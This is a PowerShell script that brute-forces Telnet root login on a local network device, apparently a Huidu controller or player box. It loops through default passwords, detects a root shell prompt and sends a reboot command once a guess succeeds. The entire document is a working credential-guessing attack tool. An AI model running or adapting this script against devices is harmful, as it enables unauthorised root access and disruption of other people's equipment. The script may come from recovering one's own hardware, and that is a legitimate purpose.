# Try common passwords for root on Telnet
$passwords = @("root", "huidu", "admin", "1234", "123456", "boxplayer", "huidu123", "12345", "password", "666666")

foreach ($pwd in $passwords) {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.NoDelay = $true
    $tcp.Connect('192.168.1.104', 23)
    $stream = $tcp.GetStream()
    $buf = New-Object byte[] 4096
    
    # Read IAC negotiation (ignore it)
    $stream.ReadTimeout = 2000
    try { $stream.Read($buf, 0, 4096) | Out-Null } catch {}
    
    # Send minimal IAC response to suppress echo
    $stream.Write([byte[]](0xFF, 0xFC, 0x01), 0, 3)  # IAC WONT ECHO
    $stream.Flush()
    
    # Read login prompt
    $stream.ReadTimeout = 2000
    try { $stream.Read($buf, 0, 4096) | Out-Null } catch {}
    
    # Send username
    $stream.Write([System.Text.Encoding]::ASCII.GetBytes("root`r`n"), 0, 7)
    $stream.Flush()
    
    # Read password prompt
    $stream.ReadTimeout = 2000
    try { $stream.Read($buf, 0, 4096) | Out-Null } catch {}
    
    # Send password
    $pwdBytes = [System.Text.Encoding]::ASCII.GetBytes("$pwd`r`n")
    $stream.Write($pwdBytes, 0, $pwdBytes.Length)
    $stream.Flush()
    
    # Read response - check for shell prompt
    Start-Sleep -Milliseconds 1000
    $stream.ReadTimeout = 2000
    try {
        $n = $stream.Read($buf, 0, 4096)
        if ($n -gt 0) {
            $text = [System.Text.Encoding]::ASCII.GetString($buf, 0, $n) -replace '[^\x20-\x7E\r\n]', '.'
            if ($text -match "#|(\$\s*$)") {
                Write-Host "SUCCESS with password '$pwd'! Shell: '$text'"
                # Send reboot command
                $stream.Write([System.Text.Encoding]::ASCII.GetBytes("reboot`r`n"), 0, 8)
                $stream.Flush()
                $tcp.Close()
                Write-Host "Reboot sent!"
                exit 0
            } else {
                Write-Host "Password '$pwd' failed: '$text'"
            }
        }
    } catch {
        Write-Host "Password '$pwd' -> timeout"
    }
    
    $tcp.Close()
    Start-Sleep -Milliseconds 300
}
Write-Host "All passwords tried"
